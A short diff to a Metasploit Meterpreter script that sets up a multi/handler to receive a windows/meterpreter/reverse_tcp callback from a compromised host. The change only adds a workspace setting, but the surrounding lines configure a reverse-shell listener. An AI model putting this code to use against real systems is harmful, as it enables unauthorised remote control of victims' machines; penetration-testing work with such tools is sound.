@@ -104,6 +104,7 @@ client.sys.process.get_processes().each do |m|
 
 		# Our handler to recieve the callback.
 		handler = client.framework.exploits.create("multi/handler")
+		handler.datastore['WORKSPACE']      = client.workspace
 		handler.datastore['PAYLOAD'] 		= "windows/meterpreter/reverse_tcp"
 		handler.datastore['LHOST']   		= rhost
 		handler.datastore['LPORT']   		= rport
@@ -119,3 +120,4 @@ client.sys.process.get_processes().each do |m|
 
 	end
 end
+
